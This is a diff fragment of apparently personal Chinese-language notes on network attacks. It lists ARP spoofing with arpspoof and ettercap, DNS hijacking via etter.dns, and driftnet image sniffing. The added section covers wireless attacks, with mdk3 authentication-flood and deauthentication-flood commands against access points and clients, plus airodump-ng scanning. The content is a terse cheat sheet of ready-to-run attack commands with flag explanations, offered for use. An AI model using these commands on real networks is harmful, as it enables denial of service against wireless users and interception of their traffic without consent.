@@ -13,8 +13,20 @@ aspspoof -i -t要欺骗的主机，要伪造的主机一般是网关 arp攻击�
 
 开启妆发功能 proc/sys/net/ipv4/ip_forward
 ettercap -Tq  -i eth0  T 文本模式  安静模式  arp欺骗
+图形版可以配合/etc/ettercap/etter.dns做DNS劫持
 
 driftnet -i eth0 获取经过ETH的图片并显示
+
+无线攻击
+身份验证攻击 auth flood 要AP发送大量伪造的身份验证请求贞，当收到大量伪造的身份验证请求超过所能承受范围。就断开了
+airodump-ng wlan 查看当前无线网络状况
+mdk3 wlan0 a -a mac地址
+a 表示DOS攻击  -a 攻击者指定的AP  -S 发送的速度
+取消验证洪水攻击
+通过欺骗从AP到客户端单播地址的取消身份验证来将客户端转为未关联状态
+mdk3 wlan d -c 1[,6,11] [-w file -b file]
+mdk3 wlan d -c 11
+
 
 
 
